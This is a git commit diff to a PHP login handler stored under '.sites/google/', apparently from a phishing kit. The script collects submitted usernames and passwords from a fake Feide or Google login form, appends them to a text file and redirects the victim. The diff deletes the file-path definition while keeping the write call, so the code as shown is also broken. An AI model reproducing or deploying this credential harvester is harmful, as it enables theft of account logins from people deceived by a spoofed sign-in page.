067870b9cb773fc9c214e3325de1244bfa309800
Hmmmmmmmmmmmhm <100936112+Hmmmmmmmmmmmhm@users.noreply.github.com>
2025-04-10 21:01:27 +0200

    login.php

--- .sites/google/login.php
+++ .sites/google/login.php
@@ -1,20 +1,10 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
 // Get the username and password from the POST request
 $username = $_POST['feidename'] ?? 'No username provided';
 $password = $_POST['password'] ?? 'No password provided';
 
-// Define the absolute path to the file
-$filePath = '/path/to/your/directory/usernames.txt';
-
 // Log the credentials to a file
-if (file_put_contents($filePath, "Username: " . $username . " Password: " . $password . "\n", FILE_APPEND) === false) {
-    echo "Failed to write to file.";
-} else {
-    echo "Credentials saved successfully.";
-}
+file_put_contents($filePath, "Feide Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
 
 // Redirect to a confirmation page
 header('Location: confirmation.html');
